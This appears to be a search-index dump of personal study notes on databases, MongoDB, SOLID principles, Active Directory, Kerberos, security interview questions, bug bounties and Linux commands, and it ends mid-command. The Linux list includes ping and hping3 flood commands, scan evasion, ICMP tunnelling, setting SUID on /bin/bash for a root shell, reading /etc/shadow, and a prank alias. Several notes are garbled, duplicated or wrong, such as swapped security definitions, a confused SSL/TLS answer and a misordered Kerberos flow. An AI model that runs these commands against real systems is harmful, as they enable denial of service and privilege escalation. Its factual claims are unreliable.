tables \u2022 One table for general entity which becomes the Parent table. \u2022 One table for each of the specialised entities, which becomes the Child table respectively. \u2022 Create TWO one-to-one relationships optional on one side between the Parent table and the respective Child tables. \u2022 FK of each Child table references PK of the Parent table. \u2022 PK of each Child table is the same as the PK of Parent table.</p> <p>Types of Integrity Rules \u2022 Domain Integrity \u2022 Key Integrity \u2022 Entity Integrity \u2022 Referential Integrity</p> <p>Enforce Referential Integrity \u2022 It is possible for an attribute NOT to have a corresponding value, but it will be impossible to have an invalid entry. \u2022 The enforcement of the referential integrity rule makes it impossible to update or delete a row in a table whose primary key has mandatory matching foreign key values in the another table. \u2022 DELETE CASCADE - Automatically deletes the matching records in the child table when the corresponding parent record is deleted. \u2022 UPDATE CASCADE - Automatically updates the matching records in the child table when the corresponding parent record is updated.</p>"},{"location":"Computer%20Science/Database/NoSQL/","title":"NoSQL","text":"<p>Database    Database Table       Collection Row/Entity  Document Column          Key</p> <p>show db                 --? show all available databases use namedb      ---? access database show collections        ---? show all the collections on the database db.mydb.help()          --&gt; show all functionalities of the database db.dropDatabase()   ---&gt; To drop the database db           --&gt; to see current database</p> <p>db.name.insert({name : Tom, age: 12}) db.name.save({name : \"Craterus\", role : \"General\"}) # _id field is </p> <p>db.dbname.insertOne({name : \"Perdicass\", age : 35})</p> <p>db.dbname.insertMany({name : \"Meliyager\", role : \"Distraction\"}, {name : \"Coenus\", role : \"Right Flank\"})</p> <p>db.dbname.updateOne({name : \"X1\" , age : 25})</p> <p>db.dbname.updateMany({name : \"X2\", age : 23},{name : \"X3\", age : 42})</p> <p>db.updateOne({name : \"X8\", {set : $age : 14}})</p> <p>db.collection.replaceOne({name : \"W2\"}, {name : \"R4\"})</p> <p>db.dbname.deleteOne({name : \"SAE\"}) db.dbname.deleteMany({name : \"XLS\"})</p> <p>db.collectionName.remove(); or db.collectioName.remove({})</p> <p>READ operations</p> <p>db.collectionName.find({name : \"CS\"}) db.collectioName.findOne({name : \"SS\"})</p> <p>db.collectionName.find({name : \"OPTIO\"})</p> <p>db.collectioName.find({name : 'ERR'},{id : 0 , age : 1})</p> <p>db.collectionName.find({name : 'KL'}, {id : false, address : true}).pretty()</p> <p>Question Update Tom's marks to 55 where marks are 50 (Use the positional operator $)</p> <p>db.collectionName.updateOne({name : \"Tom\", marks : 50}, {\"$set\" : {\"marks.$\" : 55}})</p> <p>default port is 27,017</p> <p>import pymongo</p> <p>client = pymongo.MongoClient('localhost', 27_017) db = client.mydb.mycollection()</p>"},{"location":"Computer%20Science/Database/SQL/","title":"SQL","text":"<p>Data vs. Information</p> <ul> <li>Data can be any individual fact like character, text, word, number, picture, sound, or video.  Data doesn\u2019t carry any significanceor purpose on its own.</li> <li>Information is useful and can be understood by the human. Information enables decision making </li> </ul> <p>Limitations of a file-based system \u2022 Data Inconsistency \u2022 Data Duplication \u2022 Data integrity problems \u2022 Incompatible file format \u2022 Security Issues \u2013 Only password security</p> <p>What is a database? \u2022 A database is a collection of logically related data.</p> <p>What is a DBMS (Database Management System) \u2022 Set of programs to access the data. \u2022 A software package designed to create and maintain databases. Eg: MS Access, MySQL, Microsoft SQL Server, Oracle, etc.</p> <p>Advantages of database systems \u2022 Minimize data redundancy \u2022 Data independence \u2022 Efficient access to data \u2022 Data integrity is high \u2022 High security \u2022 Improve data quality and accuracy \u2022 Easy data administration \u2022 Provide concurrent access \u2022 Easy data sharing</p> <p>Data Models in DBMS \u2022 Defines the logical design and structure of a database and defines how data will be stored, accessed and updated in a DBMS. \u2022 There are several data models:         - Hierarchical Model         - Network Model         - Entity-relationship Model         - Relational Model (Most widely used database model)         - Object Oriented Model</p> <p>Database Architecture 3 Level ANSI-SPARC Architecture 3 Schema (3 Tier) Architecture \u2022 It contains 3 levels/views/schemas         - External Schema (View Level )         - Conceptual Schema (Logical Level)         - Physical Schema (Internal Level) \u2022 These 3 levels are defined as levels of data abstraction. \u2022 Information about the schemas is stored in the system catalog</p> <p>People who deal with databases End users - Uses applications written by database application programmers Application Programmers - Develop packages that facilitates data access for end users. Database Administrators - Undertake the task of designing and maintaining the database.</p> <p>3 Phases of the Database Design</p> <p>Conceptual database design \u2022 Construct a model of the data used in a firm, independent of all physical considerations.</p> <p>Logical database design \u2022 Construct a model of the data used in a firm based on specific data organisation. (eg: relational schema) \u2022 It is independent of DBMS &amp; other physical considerations.</p> <p>Physical database design \u2022 Produce description of the DB implementation for DBMS \u2022 Create base relations, file organizations and indexes \u2022 Create any integrity constraints and security measures</p> <p>Database (DB) \u2022 Shared collection of logically related data (&amp; description) \u2022 Designed to meet information needs of an organization \u2022 Database Management Systems (DBMS) \u2022 Software enables users to define, create maintain the DB \u2022 Provides controlled access to this DB \u2022 Database Application \u2022 Computer program that interacts with DB by issuing a request (SQL statement) to the DBMS. e.g. online retailing system, booking system, stock management system, electronic medical record, etc.  DATABASE SYSTEM = DB + DBMS + DB APPLICATIONS</p> <p>6 main steps of DB Designing</p> <ol> <li>Requirements Analysis<ul> <li>What does the user want?</li> </ul> </li> <li>Conceptual Database Design (Entity Relationship Diagram)<ul> <li>Defining the entities, attributes, and the relationships</li> </ul> </li> <li>Logical Database Design (Map ER to Relational Schema)</li> <li>Schema Refinement (fine tune )</li> <li>Physical Database Design<ul> <li>Implementation of the design using a Database Management System</li> </ul> </li> <li>Security Design<ul> <li>Implement Controls to ensure security and integrity</li> </ul> </li> </ol> <p>Conceptual Design \u2022 The information gathered in the requirements analysis phase is used to create a high-level description of the data in a conceptual data model or semantic data model. Eg. Entity Relationship Model</p> <p>What is specialization ? \u2022 Process of maximizing differences between members of an entity byidentifying their distinguishing characteristics. \u2022 Specialization is a top-down approach in which a higher-level entity is divided into multiple specialized lower-level entities</p> <p>What is Generalization ?  \u2022 Process of minimizing differences between entities by identifying their common characteristics. \u2022 Generalization is a bottom up approach in which multiple lower level entities are combined to form a single higher level entity. \u2022 Generalization is usually used to findcommon attributes among entities to form a generalized entity.</p> <p>Participation Constraints \u2022 Determines whether every member in the superclass must participate as a member of a subclass. \u2022 Total Specialization (Mandatory)     \u2013 every entity in a super class must be a member of some subclass in some specialization. \u2022 Partial Specialization (Optional)     \u2013 allows an entity of a superclass need not belong to any of its subclasses</p> <p>Disjoint Constraint \u2022 Describes the relationship between members of the subclasses and indicates whether it is possible for a member of a superclass to be a member of one, or more than one, subclass. \u2022 There are two types of constraints:     \u2012 Disjoint (OR): In one sub classes     \u2012 Overlap (AND): In many sub classes</p> <p>Four types of specialisation and generalisation \u2022 Mandatory, OR \u2022 Mandatory, AND \u2022 Optional, OR \u2022 Optional, AND</p> <p>Generalisations with {Mandatory, AND} \u2022 Merge all entities into one table with all attributes under new table. \u2022 Create PK of the new table as the PK of the generalised entity. \u2022 Add flags to differentiate between records of previous specialised entities.</p> <p>Generalisations with {Mandatory, OR} \u2022 Create separate tables for each sub entity \u2022 One table for each of the specialised entities with the attributes of the general entity also added. \u2022 PK for the tables is the PK of original general entity. \u2022 Each table have their own relationships with the rest of the logical schema \u2022 The relationships that were associated to the original general entity are doubled up. \u2022 The relationships that were associated to each specialised entities remain the same.</p> <p>Generalisations with {Optional, AND} \u2022 Create 2 tables \u2022 One table for general entity which becomes the Parent table. \u2022 One table for all the specialised entities merged together which becomes the Child table. \u2022 Create ONE one-to-one relationship optional on one side between the 2 tables \u2022 FK of the Child table references PK of the Parent table. \u2022 PK of the Child table is the same as the PK of Parent table. \u2022 Add flags to differentiate between records of previous specialised entities.</p> <p>Generalisations with {Optional, OR} \u2022 Create many tables \u2022 One table for general entity which becomes the Parent table. \u2022 One table for each of the specialised entities, which becomes the Child table respectively. \u2022 Create TWO one-to-one relationships optional on one side between the Parent table and the respective Child tables. \u2022 FK of each Child table references PK of the Parent table. \u2022 PK of each Child table is the same as the PK of Parent table.</p> <p>Types of Integrity Rules \u2022 Domain Integrity \u2022 Key Integrity \u2022 Entity Integrity \u2022 Referential Integrity</p> <p>Enforce Referential Integrity \u2022 It is possible for an attribute NOT to have a corresponding value, but it will be impossible to have an invalid entry. \u2022 The enforcement of the referential integrity rule makes it impossible to update or delete a row in a table whose primary key has mandatory matching foreign key values in the another table. \u2022 DELETE CASCADE - Automatically deletes the matching records in the child table when the corresponding parent record is deleted. \u2022 UPDATE CASCADE - Automatically updates the matching records in the child table when the corresponding parent record is updated.</p>"},{"location":"Computer%20Science/Design%20Patterns/Solid/","title":"Solid","text":"<p>Solid Principles</p> <p>S = Single Responsibility Principle  each class should focus on 1 single functionality</p> <p>O = Open Closed Principle  softwares should be open to extension but should close for modifications</p> <p>L = Liskov Substitution Principle  object of a superclass should be replaceable with objects of a subclass without affecting correctness</p> <p>I = Interface Segregation Principles A class should not be forced to implement interfaces it does not use</p> <p>D = Dependency Inversion Principle  High level modules should not depend on low-level modules. Both should not depend on abstraction</p>"},{"location":"Computer%20Science/Other/Web/","title":"Web","text":"<p>Vertical scaling, or increasing the amount of CPUs or capacity in a single machine !!! GO is here  Horizontal scaling, or increasing the number of machines to expand capacity</p> <p>Is webservice a web application?</p> <p>Web application is a computer program that responds to an HTTP request by a client and sends back HTML back to client in an HTTP response</p> <p>In other words, a program needs to fulfill only two criteria to be considered a web app:</p> <ol> <li>program must return HTML to a calling client that renders HTML and displays to a user.</li> <li>data must be transported to the client through HTTP.</li> </ol> <p>if a program doesn\u2019t render HTML to a user but instead returns data in any other format to another program, it is a web service</p> <p>HTTP is a stateless, text-based, request-response protocol that uses the client-server computing model.</p> <p>Request-response is a basic way two computers talk to each other. The first computer sends a request to the second computer and the second computer responds to that request. A client-server computing model is one where the requester (the client) always initiates the conversation with the responder (the server). As the name suggests, the server provides a service to the client. In HTTP, the client is also known as the user-agent and is often a web browser. The server is often called the web server.</p> <p>Having said that, HTTP 1.1 does persist connections to improve performance.</p> <p>CGI (Common Gate Interface) SSI (Server side includes)</p> <p>A method is considered safe if it doesn\u2019t change the state of the server A method is considered idempotent if the state of the server doesn\u2019t change the second time the method is called with the same data</p>"},{"location":"Cybersecurity/AD/AD/","title":"AD","text":"<p>What is active directory autentication </p> <p>It is a system in windows that checks if users, devices and services are allowed to access the AD Network  AD authentication helps IT Teams easily manages   users,permission,Devices, User setting with a feature called AD Group policy AD autentication let users sign in just once and access different parts of the company's network without having to <code>Sign In Again</code> (SSO)</p> <p>Before AD sutentication there were other systems called LAN Manager, NT LAN Manager (LM, NTLM) But they used weak methods to protect information AD authentication was created to fix these issues.  AD Authentication uses two standards     - Kerberos     - Lightweight Directory Access Protocol</p> <p>With Kerberos-based AD authentication You only need to Log In once to access multiple things on the network</p> <p>Instead of sending your login details over the network. Kerberos creates a special key just for you This key lasts for a certain length of time, while it's active you won't have to keep re entering your password  Kerberos also makes sure you only access things you're allowed to by creating a token with all the permission and rights for the account</p> <p>LDAP  Simple Authentication - Just require your login detials to connect to the server Simple Authentication and secuirty layer (SASL)  - Adds other authentication requiremenrts      Because its separate the way you prove yourself from the actual applications you're using</p> <p>There are two ways to connect linux to active directory LDAP  - Admin reconfigure the device to access plugable authentication module(PAM) SAMBA - </p> <p>MAC OS  AD connect using     - LDAP     - AD connector</p> <p>To make AD work on some MAC, IT Teams  have to use weaker  secuirty measures </p> <p>Since AD was developed to focus on Winodws, combining it with other OS and cloud based systems is not very efficient Instead of using 1 system IT system using different systems end up being more complex  and time consuming for IT admin to manage</p>"},{"location":"Cybersecurity/AD/Kerberos/","title":"Kerberos","text":"<p>What is Kerberos?</p> <p>A protocol used for authentication Uses tickets to authenticate and identify Uses symmetric key crypto</p> <p>Active directory uses Kerberos by default Passwords are not stored on the local workstation any longer : stored on domain controller</p> <ol> <li>Clients sends TGT</li> <li>KDC verifies the credentials and sends back the encrypted TGT</li> <li>Client stores TGT locally</li> <li>Client sends local TGT with SPN for the service it want to access</li> <li>TGS sends session key for the service to Client</li> <li>Client sends session key to service</li> </ol> <p>What is a Kerberos realm?</p> <p>Admin created  Contains all machine available for access Policy restrictions The client, </p> <p>Contains 2 section 1) KDC Clients - Workstation, HTTP service, Email service, File sharing service 2) KDC itself - authentication server, Ticket granting server</p> <p>Request a TGT  * Client sends plaintext Request for a TGT -- Name -- Name of service -- IP address -- Lifetime of ticket </p> <p>All applications ran use memory, this includes operating systems</p> <p>When an appilication loads it will load itself into memory When this happens EIP will start moving through the code based on its entry points and start executing the instructions at each memory level</p> <p>What we have talked about so far is physical memory there is such thing as virtual memory, this is often called SWAP</p> <p>Swap loads bits of memory phycially on the hard drive that is not as commonly used to conserve space in RAM  This makes reading from SWAP much slower than RAM but will allow you to store more data in memory</p>"},{"location":"Cybersecurity/General/Introduction_Questions/","title":"Introduction Questions","text":"<ol> <li> <p>What is cybersecuity \u2022 Cybersecuirty is the combination of process, practicies and technologies to protect networks, computers, programs, data and information from attack, damage or unauthorized access</p> </li> <li> <p>What do you have on your home network? \u2022 A home network gives you test enviornment for experimentation. Active directory domain controller, a dedicated firewall appliances and a net attached toaster- as long as you are learning and fidding with it, that's what matters</p> </li> <li> <p>What is encryption? why is it important? \u2022 A process of converting data into an unreadable from to prevent unauthorized access and thus ensuring data protection</p> </li> </ol>"},{"location":"Cybersecurity/General/Introduction_Questions/#4-tell-me-the-difference-between-symmetric-and-asymeteric-encryption","title":"4. Tell me the difference between symmetric and asymeteric encryption","text":""},{"location":"Cybersecurity/General/Introduction_Questions/#basis-symmetric-encryption-asymmetric-encryption","title":"Basis      |   Symmetric Encryption        |   Asymmetric Encryption","text":"<p>Encryption      Single key for both encryption     Use different keys for encryption  key             and decryption                     and decryption</p> <p>Performance     Encryption is fast but comparatively    Encryption is slow due to hig                  more vulnerable                        computation</p> <p>Algorithms        DES, 3DES, AES, and RC4               Deiffie-Hellman, RSA</p> <p>Purpose            Used for bulk data transmission    Often used for securely exchaning secret keys</p> <ol> <li> <p>What is CIA triad? \u2022 The CIA triad for information secuirty, provides a baseline standard for evaluating and implementing information secuirty - irrespective of the system and/or organization in question</p> </li> <li> <p>What do you understand by risk, vulnerability &amp; threats in a network? Threat  -  Refers to someone with the potential to do harm to a system or an organization Vulnerability  Refers to a weakness of an asset(resource) that can be exploited by one or more attackers(threat actors). In other   words, it is an issue or bug that allows an attack tobe successful Risk  -   Refers to the potential for loss or damage when a threat exploits a vulnerability</p> </li> <li> <p>How do you report Risks? \u2022 Risk needs to be assessed first before it can be reported. There are two ways you can analyse risk. It can be either Quantitative or Qualitative \u2022 This approach is suitable for both technical and business guys \u2022 The business guys will see the probable loss in numbers while the technical guys will monitor and assess the impact and frequency. Depending on the audience, the risk can then be reported</p> </li> <li> <p>How do you differentiate between IPS and IDS system? IDS = Intrusion Detection System IPS = Intrusion Prevention System IDS just detect the intrusion and leaves the rest to the administrtor for assessment and evaluation or any further action IPS detect the intrusion and takes necessary action to further prevent intrusion Also there is a differnce in the positioning of devices in the network. Although they work on the same concept, the placemnt is different</p> </li> <li> <p>What do you know about Cybersecuirty Frameworks?</p> </li> <li>PCI DDS </li> <li>ISO 27001/27002</li> <li>CIS </li> <li> <p>NIST</p> </li> <li> <p>What is weak information Security \u2022 Information secuirty policy is considered to be weak if does not meet the criteria  of an effective one. The criteria include: Distribution, review, Comprehension, and uniform  Information security is weak if: -&gt; The policy has not been made readily available for review by every employee within the organization -&gt; The organization is unable to demonstrate that employees can review the policy document -&gt; The organization is unable to demonstrate that employees understand the content of the policy documemt</p> </li> <li> <p>What's the better approach of setting up a firewall?</p> </li> <li> <p>Username/password: Modify the default password for your firewall device</p> </li> <li>Remote Administration : Disable the feature of remote administartion from outside the network</li> <li>Port forwarding: For certain application to work properly, such as web server of FTP server, you need to configure appropiate port forwarding</li> <li>DHCP server : INstalling a firewall on a network with an existing DHCP server will cause conflicts unless the firewall's DHCP server is disabled</li> <li>Logging : In order to troubleshoot firewall issues or potential attacks, you want to make sure to enable logging and understand how to view the logs</li> <li> <p>Policies : you want to have solid secuirty policies in place and make sure that your firewall is configured to enforce those policies</p> </li> <li> <p>Can you explain SSL encryption? SSL (Secure Socket Layer) \u2022 is a protocol which enables safe conversation between two or more parties. It is designed to identify and verify that the person you are talking to on the other end is who they say they are.</p> </li> </ol> <p>HTTPS \u2022 is HTTP combined with SSL which provides you with a safer browsing experience with encryption. Sp, this a very tricky questions but SSL wins in terms of secuirty</p> <ol> <li> <p>Which one is more secure SSL or TLS? SSL  \u2022 is a meant to verify the sender's identify but it doesn't search for any more hazards than that. SSL can help you track the person you are talking to but that can also be trciked at times TLS  \u2022 is another identification tool just like SSL, but it offers better secuirty features. It provides additional protection to the data and hence SSL and TLS are often used together for better protection</p> </li> <li> <p>What are Salted Hashes? \u2022 Salt is a random data. When a properly protected password system receives a new password, it creates a hash value of that password, a random salt value, and then combined value is stored in its database. This helps defend against dictionary attacks and known hash attacks Example : A person use the same password on two different systems and they are being used using the same hashing algorithm, the hash value would be same, howvever if even one of the system uses salt with the hashes, the value will be different</p> </li> <li> <p>How identity theft could be prevented?</p> </li> <li>Ensure strong and unique password </li> <li>Avoid sharing confidential information online especially on social media</li> <li>Shop from known and trusted websites</li> <li>Use the latest version of the browesers</li> <li>install advanced malware and spyware tools</li> <li>Use specialized secuirty solutions against finacial data</li> <li>Always update your system and the software</li> <li> <p>Protect your SSN </p> </li> <li> <p>How can you prevent Man in the middle (MITM) attack? \u2022 MITM attacks happens when a communication between two parties(system) is intruded or intercepted by an outside entity First method \u2022 To prevent this attacks would be to have encryption (preferably public key ecncryption) between both the parties. This way, they both will have an idea with whom they are talking because of the digital verification Second method \u2022 To prevent this, it is best to avoid open WIFI networks and if it is necessary then use plugins like HTTPS, Forced TLS etc.</p> </li> <li> <p>State differences between encoding, hahsing and encryption</p> </li> </ol> <p>Encoding: Converts the data in a desired format required for exchange between different systems Hashing  Maintains the integrity of a message or data. Any change done any day could be noticed Encryption Ensures that the data is secure and one needs a digital verification code or image in order  to open or access it</p> <ol> <li> <p>What steps will you atek to a secure a server \u2022 Secure servers use the Secure Socket Layer(SSL) protocol for data encryption and decryption protected data from unauthorized interception 4 stpes 1) Making sure that have a secure password for root and administration users 2) Making a new users on your systems. These will be useres use to manage the system 3) Remove remote access from the default root/adminsitartor accounts 4) The next step is to configure firewall rules for remote access</p> </li> <li> <p>What is DDos attack? How is it mitigated? \u2022 DDoS stands for distributed denial of services. When a network is flooded with large number of requests which is not recognized to handle making the server unavilable to the legitimate requests \u2022 DDoS can be mitigated by analysing and filtering the traffic in the scrubbing centers. The scrubbing centers are centralized data cleansing station wherein the traffic to a website is analysed and the malicious traffic is removed</p> </li> <li> <p>Why do you need DNS monitoring? \u2022 The domain Name system allotes your website under a certain domain that is easily recognizable and also keep the information about the other domains names. It works like a directory for everything on the internet. Thus, DNS monitoring is very important since you can easily visit a website without actually having to memorise their IP address.</p> </li> <li> <p>What is a three-way handshake \u2022 The TCP three-way handshake is the method used by TCP set up a TCP/IP connection over an internet Protocol based network. \u2022 TCP's three way handshaking techniques is often reffered to as SYN-SYN-ACk (or more accurately SYN, SYN-ACK, ACK) because there are messages transmitted by TCP to negotiate and start a TCP session between two computers</p> </li> </ol> <p>22.</p> <ol> <li> <p>How often should you perfrom Patch management? \u2022 Patch manage should be done as soon as it is released. For windows, once the patch is released it should be applied to all machines not later than 1 month. Same goes for network devices, patch it as soon as it is released. Proper patch management process should be followed</p> </li> <li> <p>What do you know about application secuirty? \u2022 Application secuirty is the practise of improving the security of application using software, hardware and other procedral methods \u2022 Countermeasures are taken to ensure application security, the most common being an application firewall is that limits the execution of files or the handlinf of data by specific installed programs</p> </li> <li> <p>Differntiate between penetration testing and software testing? Peneration Testing = helps identify and address the security vulenrabilities Software Testing = Focuses on the functionality of the softwares and not the secuirty aspect</p> </li> <li> <p>When to use tracert/traceroute? \u2022 Small TTL values are transmitted through packets via traceroute. This prevents the packets from getting into loops. In case you can't ping the final destination, tracerout will help to identify where the connection stops or gets broken, whether it is firewall, ISP, router etc </p> </li> <li> <p>Tell me about common cyber threats</p> </li> <li>Malware</li> <li>Phising</li> <li>Man in the Middle</li> <li>Maladvertising</li> <li>DDoS</li> <li>Rouge Software</li> <li>Drive bt Downloads</li> </ol> <p>28</p> <ol> <li> <p>How would you reset a password-protection BIOS configuration \u2022 Since BIOS is a pre boot system it has its own storage mechanism for its settings and preferences. In the classic scenario, simply popping out the CMOS (complementary metal-oxide-semiconductor) battery will be enough to have the memory storing these settings lose its power supply, and as a results it will lose its settings \u2022 The simplest way by far however is this: if the BIOS has come from the factory with a default password enabled, try <code>password</code></p> </li> <li> <p>What is cross site scripting or XSS \u2022 XSS refers to client side code injection attack wherein an attacker can execute malicious into a legitimate website or web application \u2022 XSS is amongst the most rampant of web application vulnerabilities and occures when a web application makes use of unvalidated or unencoded user input within the output it generates</p> </li> <li> <p>What is data protection in transit vs data protection at rest? Data protection in transit \u2022 This when data isgoing from server to client \u2022 Effective data protection measures for in transit data are critical as data is less secur when in motion Data protection at rest \u2022 This is when data is just sitting there in its database or on its hard drive \u2022 Data at rest is sometimes considered to be less vulenrable than data in transit</p> </li> <li> <p>Tell me the differences between cybersecuirty and network security Cybersecuirty \u2022 Describes that the policies and procedures implemented by a network administrator to avoid and keep track of unauthorized access, exploitation, modificationm, or denial of the network and network resources</p> </li> </ol> <p>Network Security  \u2022 Process and practices designed to protect networks, computers programs and data from attack, damage or unauthorized access. In a computing context, secuirty includes both cyber security and physical security</p> <ol> <li> <p>How will you prevent data lekage</p> </li> <li> <p>Data lekage is when data gets out of the organization in an unauthorized way</p> </li> <li>Data can get leaked through various ways - emails, prints, laptop getting lost unauthorized uplaod of data of data to public portals, removable drivers, photographs etc</li> <li> <p>A few controls can be restricting upload on internet websites, following an internal encryption solution, restricting the mails to internal networks, restricts on printing confidentails data etc</p> </li> <li> <p>What is an ARP and how does it work?</p> </li> <li>Address Resolution Protocol(ARP) is a protocol for mapping an Internet protocol address(IP address) to a physical machine address that is recognized in the local network How it works?</li> <li>When an incoming packet destined for a host machine on a particular local area network arrives at a gateway asks the ARP program to find a physical host or MAC address that matches the IP address.</li> <li>The ARP program looks in the ARP cache and, if it finds the address, provides it so that the packet can be convereted to the right packet length and formats and sent to the machine</li> <li> <p>If no entry is found for the IP address, ARP broadcast a request packet in a special formats to all the machines on the LAN to see if one machine knwos that it has that IP address asscociated with it</p> </li> <li> <p>What is 2FA and how can it be implemented for the public websites? \u2022 An extra layer of secuirty that is known as \"multi factor authentication\" \u2022 Requires not only a password and username but also something that only, and only, that user has on them  ex: Piece of information only they should know or have immediately to hand such as a physical token  \u2022 Authenticator apps replace the need to obtain a verification code via text, voice call or email</p> </li> <li> <p>What techniques can be used to prevent brute force login attack \u2022 Here the attacker tries to determine the password for a target (services/system/device) through a permutation of fuzzing process \u2022 As it is a length task, attackers usually employ a software such as fuzzer, to automate the process of creating numerous passwords to be tested against a target \u2022 In order to avoid such attacks-passwords best practices should be followed mainly on critical resources like servers, routers, exposed services so on</p> </li> <li> <p>What is cognitive cybersecurity \u2022 Application of AI technologies patterned on human thought processes to detect threats and protect physical and digital systems \u2022 Self learning security systems use data mining, pattern recognition and natural langauge processing to simulate the human brain, albeit in a high powered computer model</p> </li> <li> <p>What is port blocking withing LAN? \u2022 Restricting the users from accessing a set of services within the local area network is called port blocking \u2022 Stopping the source to not to access the destination node via ports as application works on the ports so ports are blocked to restrict the access filling up the security holes in the network infrastructure</p> </li> <li> <p>What is the differences between VPN and VLAN?</p> </li> </ol> <p>VPN \u2022 related to remote access to the network of a company \u2022 used to connect two points in a secured and encrypted funnel \u2022 Saves the data from prying eyes while in transit and no one on the net can capture the packets and read the data</p> <p>VLAN \u2022 helps to group workstation that are not within the same location into the same broadcast domain \u2022 Basically a means to logically segregate networks without physically segregating them with various switches \u2022 Does not involve any encryption technique but it is only used to slice up your logical network into different sections for the purpose of management and security</p> <ol> <li>What protocols falls under TCP/IP internet layer?</li> </ol> <p>TCP/IP Layer                                            Protocol Examples Application                     NFS, NIS+,DNS, telnet, ftp, rlogin, rsh, rop, RIP, RDICS,SNMP Transport                       TCP, UDP Internet                         IP, ARP, ICMP Data link                       PPP, IEEE 802 2 Physical Network            Ethernet(IEEE 802.3) Token Ring, RS-232 other</p>"},{"location":"Cybersecurity/General/bugBounty/","title":"bugBounty","text":"<p>Companies will bug bounty programs in 2 ways  - Bug bounty platforms - Independantly hosted website </p> <p>Pros of platforms - transparency, confilct resolution Cons of platforms - 3rd party employees want aware of company details</p> <p>Payamount Amount - Vulnerability disclosure prorgram (VDP) - bug bounty programs </p> <p>Response time - Might takes weeks, and frustration Private program and public programs</p> <p>Unpaid programes often ignored by experienced bug hunters. since they dont pay monetray value. But for begineers repuatation might require to join to private program </p> <p>Writing a good report </p> <ol> <li>Craft a descriptive title </li> <li>Provide a clear summary</li> <li>Include a severity assesment </li> <li>Give clear steps to reproduce </li> <li>Provide a proof of concept </li> <li>Describe the impact and attack scenarios</li> <li>Recommend possible mitigation</li> </ol> <p>Report States 1. Need more information 2. Informative 3. Duplicate  4. N/A  5. Triaged  6. Resolved </p> <p>Private programs are great because less crowd and less competition means fewer duplicates  Do not report minor bugs it will be ignored, try to exploit it  Put in organization shoes, describe the impact of the vulnerability to the company Joining wrong program, some companies delay due to lack of resources, downplaying to avoid paying hackers Single functionality of the application to find complex bugs Recon has to even company is doing it </p> <p>Struck?  1. Sometimes hacking is a time consuming task with no results  2. Building a skillset 3. Gain fresh perspective</p>"},{"location":"Cybersecurity/Linux/A1/","title":"A1","text":"<p>echo \"{something}\"  | base 64</p>"},{"location":"Cybersecurity/Linux/Kernal/","title":"Kernal","text":"<p>A device driver (driver) is a piece of software that controls a particular type of device which is connected to the computer systems</p> <p>Device driver has 3 sides     - One side talks to the rest of the kernal     - One talks to the hardware     - One talks to the user</p> <p>User ------------------     |                    |     |                    |     |                    |    Kernal                |     |                    |Device file     | Device Driver      |     |                    |     Hardware ------------ |</p> <p>What is kernal module  - Traditional way of adding code to the kernal was to recompile the kernal and reboot the system - Kernal modules are piece of code that can be loaded/inserted and unloaded/removed from the kernal as per the dameon need</p> <p>Other Name     1. Loadable Kernal Module (LKM)     2. Modules</p> <p>Extenion .ko (kernal object) Modules are installed on the lib/modules/&lt; kernal version&gt; </p>"},{"location":"Cybersecurity/Linux/Kernal2/","title":"Kernal2","text":"<p>Linux system consist of (even tiny!)</p> <ol> <li>Nootloader</li> <li>Operating System (OS) kernel</li> <li>Root filesystem</li> </ol> <p>Additional:      If the processor family is ARM or PPC (32- or 64-bit), a Device Tree Blob (DTB) image file     An initramfs (or initrd) image file</p> <p>uname -r major#.minor#[.patchlevel][-EXTRAVERSION]</p>"},{"location":"Cybersecurity/Linux/Linux/","title":"Linux","text":"<pre><code>\u2022 ls                                                       \n\u2022 pwd                                                  \n\u2022 cd\n\n\u2022 rm                                                 \n\u2022 rmdir \n\u2022 rm -r {dir}\n\n\u2022 cp {src} {dest}\n\u2022 mv {}  ./Path\n\u2022 touch {name}\n\n\u2022 cat  {file}\n\u2022 more {file}\n\u2022 nano {file}\n\n\u2022 ifconfig \n\u2022 grep {conetnt} {filename}\n\u2022 locate {filename}\n\n\u2022 uname -i \n\u2022 hostname \n\u2022 uptime\n\u2022 sudo apt-get \n\u2022 ip a\n\u2022 ip r\n\u2022 ip n\n\n\n\u2022 ping -s 1300 -f {ip address}\n\u2022 hping3 -S -V --flood {ip address}\n\u2022 hping3 --tracerout -V -1 {domain} \n\u2022 hping3 --traceout -V -p 80  -S -A --baseport 1337 {doamain}\n\n\u2022 ptunnel -p {ip address} -lp 8000 -da {ip} -dp  22\n\u2022 tcpdump -i any icmp\n\u2022 ssh -p 8080 {domain@localhost}\n\u2022 grep -Hnri tree | ???\n\n\u2022 nmap --source-port {ip}\n\u2022 nmap -D RND:10\n\u2022 masscan -p80,443,22, {ip} --rate=1000\n\u2022 masscan {ip} -p0-65535 --rate=1000 --randomize-hosts\n\n\u2022 sl\n\u2022 cat /dev/urandom\n\u2022 alias ls = \"cat /dev/urandom\"\n\n\u2022 whois {domain}\n\u2022 whatweb {domain}\n\u2022 curl -i {link}\n\n\u2022 gobuster dir -u {domain} -w {wordlist file}\n\u2022 apt install seclist\n\u2022 apt install wget\n\n\u2022 gobuster dns -d {website} -w {wordlist file}\n\u2022 apt install sublist3r\n\u2022 sublist3r -d {domain}\n\n\u2022 wpscan --url {domain} --enumerate -u\n\u2022 wpscan --url {domain} --enumerate -t\n\u2022 wpscan --url {domain} --enumerate vp,vt --plugins-detection aggressive \n\u2022 wpscan --url {domain} --api-token {api} --enumerate  u\n\n\u2022 amass enum -d {domain}\n\u2022 amass enum -passive -d {domain}\n\n\u2022 git clone {searchploit url}\n\u2022 searchploit wordpress plugings\n\u2022 searchploit ssh\n\n\u2022 /bin/bash\n\u2022 /bin/bash -p\n\u2022 /bin/bash\n\u2022 sudo chmod +s /bin/bash\n\u2022 bash -p\n\n\u2022 tcpdump -w capture.pcap -i eth0\n\u2022 tcpdump -i eth0 -c 100\n\n\u2022 tshark -V -c 1 -i  eth0\n\u2022 tshark -Y'http.request.method == \"GET\" -I eth0\n\u2022 timeout 15 tshark -i eth0 -w tshark.pcap\n\u2022 tshark -r tshark.pcap -qz endpoints,ip \n\u2022 tshark -r tshark.pcap -qz follow,tcp,ascii7\n\u2022 tshark -e ip.src -e ip.dst -e frame.protocols -T fields -r capture.pcap\n\n\u2022 ssh networkchuck@{ip}\n\u2022 ssh networkchuck@{ip}\n\u2022 ssh networkchuck@{ip} 'whoami'\n\u2022 ssh -D 1337 -C -q -N root@{ip}\n</code></pre> <p>Managing users</p> <pre><code>\u2022 sudo adduser {name}\n\u2022 cat /etc/passwd\n\u2022 sudo cat /etc/shadow\n\n\u2022 sudo useradd {name}                                  #Lazy\n\u2022 sudo usermod {name} --shell /bin/bash\n\u2022 sudo usermod -l 